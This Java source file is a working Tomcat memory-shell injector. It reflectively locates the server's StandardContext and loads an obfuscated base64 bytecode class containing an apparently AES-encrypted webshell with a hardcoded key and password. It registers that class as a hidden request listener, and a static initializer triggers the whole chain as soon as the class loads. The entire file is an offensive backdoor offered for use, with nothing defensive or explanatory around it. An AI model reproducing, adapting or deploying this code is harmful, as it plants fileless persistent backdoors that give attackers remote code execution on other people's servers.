package core.memshell;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Iterator;
import java.util.List;

public class TomcatListenerMemShell {

    public static Object STANDARD_CONTEXT;
    public static Object RESPONSE;
    public static Object MEMSHELL_OBJECT;
    static String ListenerName = "memshell.TomcatListenerShell";

    public TomcatListenerMemShell() {
        try {
            if (STANDARD_CONTEXT == null) {
                getStandardContext();
                getStandardContext1();
            }
            if (!isInject()) {
                injectMemShellClass();
                injectMemShell();
            }
        } catch (Exception var2) {

        }
    }

    private static synchronized boolean isInject() {
        boolean flag = false;
        try {
            Method var14 = STANDARD_CONTEXT.getClass().getDeclaredMethod("getApplicationEventListeners");
            var14.setAccessible(true);
            Object[] objects = (Object[]) var14.invoke(STANDARD_CONTEXT);
            for (Object object : objects) {
                if (object.getClass().getName().equals(ListenerName)) {
                    flag = true;
                }

            }

        } catch (Exception e) {

        }

        return flag;
    }

    private static synchronized void injectMemShell() {
        try {
            try {
                Field var10 = STANDARD_CONTEXT.getClass().getDeclaredField("applicationEventListenersObjects");
                var10.setAccessible(true);
                Object[] var12 = (Object[]) ((Object[]) var10.get(STANDARD_CONTEXT));
                List var13 = Arrays.asList(var12);
                ArrayList var3 = new ArrayList();
                Boolean var4 = false;
                Iterator var5 = var13.iterator();

                while (var5.hasNext()) {
                    Object var6 = var5.next();
                    var3.add(var6);
                    if (var6.getClass().getName().equals(ListenerName)) {
                        var4 = true;
                    }
                }

                if (!var4) {
                    var3.add(MEMSHELL_OBJECT);
                    Method var14 = STANDARD_CONTEXT.getClass().getDeclaredMethod("setApplicationEventListeners", Object[].class);
                    var14.setAccessible(true);
                    var14.invoke(STANDARD_CONTEXT, (Object) var3.toArray());
                }
            } catch (Exception var8) {
                Method var11 = STANDARD_CONTEXT.getClass().getDeclaredMethod("addApplicationListener", String.class);
                var11.invoke(STANDARD_CONTEXT, ListenerName);
                Method var2 = STANDARD_CONTEXT.getClass().getDeclaredMethod("addApplicationEventListener", Object.class);
                var2.setAccessible(true);
                var2.invoke(STANDARD_CONTEXT, MEMSHELL_OBJECT);
            }

        } catch (Throwable var9) {
            Throwable var0 = var9;
        }

    }

    private static synchronized Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class var3 = var0.getClass();

        while (var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }

        if (var2 == null) {
            throw new NoSuchFieldException(var1);
        } else {
            var2.setAccessible(true);
            return var2.get(var0);
        }
    }

    private void getStandardContext1() {
        try {
            Object request = Class.forName("com.opensymphony.webwork.ServletActionContext").getMethod("getRequest").invoke(null);
            Object servletContext = invokeMethod(request, "getServletContext");
            STANDARD_CONTEXT =  getFV(getFV(servletContext,"context"), "context");
        } catch (Exception e) {
        }
    }

    private Object invokeMethod(Object obj,String methodName,Object... parameters){
        try {
            ArrayList classes = new ArrayList();
            if (parameters!=null){
                for (int i=0;i<parameters.length;i++){
                    Object o1=parameters[i];
                    if (o1!=null){
                        classes.add(o1.getClass());
                    }else{
                        classes.add(null);
                    }
                }
            }
            Method method=getMethodByClass(obj.getClass(), methodName, (Class[])classes.toArray(new Class[]{}));

            return method.invoke(obj, parameters);
        }catch (Exception e){
//        	e.printStackTrace();
        }
        return null;
    }
    private Method getMethodByClass(Class cs,String methodName,Class... parameters){
        Method method=null;
        while (cs!=null){
            try {
                method=cs.getMethod(methodName, parameters);
                cs=null;
            }catch (Exception e){
                cs=cs.getSuperclass();
            }
        }
        return method;
    }
    public static synchronized void getStandardContext() throws Exception {
        boolean var0 = false;
        Thread[] var1 = (Thread[]) ((Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads"));

        for (int var2 = 0; var2 < var1.length; ++var2) {
            Thread var3 = var1[var2];
            if (var3 != null) {
                String var4 = var3.getName();
//                if (!var4.contains("exec") && var4.contains("http")) {
                try {
                    if (var4.startsWith("http")) {
                        Object var5 = getFV(var3, "target");
                        if (var5 instanceof Runnable) {
                            Object var6;
                            try {
                                var6 = getFV(getFV(getFV(var5, "this$0"), "handler"), "global");
                            } catch (Exception var17) {
                                continue;
                            }

                            List var7 = (List) getFV(var6, "processors");

                            for (int var8 = 0; var8 < var7.size(); ++var8) {
                                Object var9 = getFV(var7.get(var8), "req");
                                RESPONSE = var9.getClass().getMethod("getResponse", (Class[]) (new Class[0])).invoke(var9);

                                Object var10 = var9.getClass().getDeclaredMethod("getNote", Integer.TYPE).invoke(var9, 1);

                                try {
                                    Field var11 = var10.getClass().getDeclaredField("context");
                                    var11.setAccessible(true);
                                    STANDARD_CONTEXT = var11.get(var10);
                                } catch (Exception var16) {
                                    Object var12 = var10.getClass().getDeclaredMethod("getServletContext").invoke(var10);
                                    Field var13 = var12.getClass().getDeclaredField("context");
                                    var13.setAccessible(true);
                                    Object var14 = var13.get(var12);
                                    Field var15 = var14.getClass().getDeclaredField("context");
                                    var15.setAccessible(true);
                                    STANDARD_CONTEXT = var15.get(var14);
                                }
                                if (STANDARD_CONTEXT != null) {
                                    var0 = true;
                                    break;
                                }

                            }

                            if (var0) {
                                break;
                            }
                        }
                    }
                } catch (Exception e) {
                }
            }
        }

    }

    public static void injectMemShellClass() {
        try {
            MEMSHELL_OBJECT = Thread.currentThread().getContextClassLoader().loadClass(ListenerName).newInstance();
        } catch (Exception var5) {
            try {
                Method var1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                var1.setAccessible(true);
                byte[] var2 = base64Decode("yv66vgAAADMBYgoAYgC5CQBJALoJAEkAuwgAvAkASQC9CAC+CQBJAL8IAMAJAEkAwQcAwgoACgC5CgAKAMMKAAoAxAoASQDFCQBJAMYIAMcJAEkAyAoAYgDJCgBiAMoIAMsKAMwAzQcAzgoAMQDPCgAWANAKAMwA0QoAzADSBwDTCADUCgDVANYKADEA1woA1QDYBwDZCgDVANoKACAA2woAIADcCgAxAN0IAN4KAC4A3wgA4AcA4QoALgDiBwDjCgDkAOUKADAA5ggA5wcA6AcAewcA6QcA6ggA6woALgDsCADtCADuCADvCADwCADxCwBgAPILAGAA8woA9AD1BwD2CgBJAPcIAPgLADwA+QgA+goAMQD7CgBJAPwLADwA/QsAPAD+CgBJAP8KAEkBAAgBAQsBAgEDBwEECgAuAQUKAEkAyQoASQEGCwECAQcIAQgLADwBBwcBCQoAUAC5CgAwAQoKADEBCwoBDAENCgAwAMQKAFABDgoASQEPCgAxARAIAREIARIKABsBEwgAZgoALgEUCgEVARYKARUBFwcBGAgAZAcBGQcBGgEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAJ4YwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA1B3ZAEABHBhdGgBAANtZDUBAAJjcwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAeTG1lbXNoZWxsL1RvbWNhdExpc3RlbmVyU2hlbGw7AQAaKExqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBAAF6AQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAFRAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQACY2IBAAJbQgEAAXgBAAcoW0JaKVtCAQABYwEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEABHZhcjQBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAFzAQABbQEAAVoBAA1TdGFja01hcFRhYmxlBwEEBwEbBwDTAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAcA6gEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAR2YXI2AQACYnMBAAV2YWx1ZQEACkV4Y2VwdGlvbnMBAAxiYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZGVjb2RlcgEACWdldFdyaXRlcgEAOihMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7KUxqYXZhL2lvL1dyaXRlcjsBAANvdXQBABBMamF2YS9pby9Xcml0ZXI7BwEYBwEcAQAQcmVxdWVzdERlc3Ryb3llZAEAJihMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OylWAQADcmVxAQAjTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudDsBABJyZXF1ZXN0SW5pdGlhbGl6ZWQBAAZhcnJPdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQABZgEAB3Nlc3Npb24BACBMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEABGRhdGEBAAR2YXI5BwEdBwD2BwEeAQAWZ2V0UmVzcG9uc2VGcm9tUmVxdWVzdAEAUShMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDspTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEABHZhcjMBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAEdmFyNQEABHZhcjgBAAR2YXIxAQAEdmFyMgEAClNvdXJjZUZpbGUBABhUb21jYXRMaXN0ZW5lclNoZWxsLmphdmEMAG4AbwwAZABlDABmAGcBABAzYzZlMGI4YTljMTUyMjRhDABoAGkBAARwQVMzDABqAGkBABAvZmF2aWNvbmRlbW8uaWNvDABrAGkBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBHwEgDAEhASIMAGwAiQwAbABpAQAFVVRGLTgMAG0AaQwAbgB1DAEjASQBAANBRVMHARsMASUBJgEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMMAScBKAwAbgEpDAEqASsMASwBLQEAE2phdmEvbGFuZy9FeGNlcHRpb24BAANNRDUHAS4MASUBLwwBMAExDAEyATMBABRqYXZhL21hdGgvQmlnSW50ZWdlcgwBNAEoDABuATUMASEBNgwBNwEiAQAQamF2YS51dGlsLkJhc2U2NAwBOAE5AQAKZ2V0RW5jb2RlcgEAEltMamF2YS9sYW5nL0NsYXNzOwwBOgE7AQATW0xqYXZhL2xhbmcvT2JqZWN0OwcBPAwBPQE+DAE/AUABAA5lbmNvZGVUb1N0cmluZwEAD2phdmEvbGFuZy9DbGFzcwEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQAWc3VuLm1pc2MuQkFTRTY0RW5jb2RlcgwBQQFCAQAGZW5jb2RlAQAKZ2V0RGVjb2RlcgEABmRlY29kZQEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIBAAxkZWNvZGVCdWZmZXIMAUMAbwwAmgFEBwEdDAFFAUYBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0DACvALABABBYLVJlcXVlc3RlZC1XaXRoDAFHAIkBAA5YTUxIVFRQUmVxdWVzdAwBSAFJDACaAJsMAUoBSwwBTACJDACXAJgMAHwAfQEAEG1lbXNoZWxsLnBheWxvYWQHAR4MAU0BTgEAHG1lbXNoZWxsL1RvbWNhdExpc3RlbmVyU2hlbGwMAU8BUAwAeAB5DAFRAVIBAApwYXJhbWV0ZXJzAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0MAVMBVAwBVQFWBwEcDAFXAVgMAVkBKAwAjQCODAFVATYBAA5YbWxIVFRQUmVxdWVzdAEAB1N1Y2Nlc3MMAVoAbwwBWwFcBwFdDAFeAV8MAWABYQEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQAkamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdExpc3RlbmVyAQATamF2YXgvY3J5cHRvL0NpcGhlcgEADmphdmEvaW8vV3JpdGVyAQAhamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAARpbml0AQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdkb0ZpbmFsAQAGKFtCKVtCAQAbamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0AQAxKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEABmxlbmd0aAEAAygpSQEABnVwZGF0ZQEAByhbQklJKVYBAAZkaWdlc3QBAAYoSVtCKVYBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAAt0b1VwcGVyQ2FzZQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAVyZXNldAEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQARZ2V0U2VydmxldFJlcXVlc3QBACAoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEACWdldEhlYWRlcgEAB2luZGV4T2YBABUoTGphdmEvbGFuZy9TdHJpbmc7KUkBAApnZXRTZXNzaW9uAQAiKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEADGdldFBhcmFtZXRlcgEADGdldEF0dHJpYnV0ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAMc2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwEABXdyaXRlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQALdG9CeXRlQXJyYXkBAA9wcmludFN0YWNrVHJhY2UBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7ACEASQBiAAEAYwAHAAEAZABlAAAAAQBmAGcAAAAAAGgAaQAAAAEAagBpAAAAAQBrAGkAAAAAAGwAaQAAAAEAbQBpAAAACwABAG4AbwABAHAAAACQAAMAAQAAAEYqtwABKgG1AAIqAbUAAyoSBLUABSoSBrUAByoSCLUACSq7AApZtwALKrQAB7YADCq0AAW2AAy2AA24AA61AA8qEhC1ABGxAAAAAgBxAAAAJgAJAAAAGwAEABMACQAUAA4AFQAUABYAGgAXACAAHAA/AB0ARQAeAHIAAAAMAAEAAABGAHMAdAAAAAEAbgB1AAEAcAAAAJsAAwACAAAARyortwASKgG1AAIq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");
                Class var3 = (Class) var1.invoke(Thread.currentThread().getContextClassLoader(), var2, 0, var2.length);
                MEMSHELL_OBJECT = var3.newInstance();
            } catch (Exception var4) {
            }
        }

    }

    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;

        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) ((byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs));
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) ((byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs));
            } catch (Exception var5) {
            }
        }

        return value;
    }

    static {
        new TomcatListenerMemShell();
    }
}
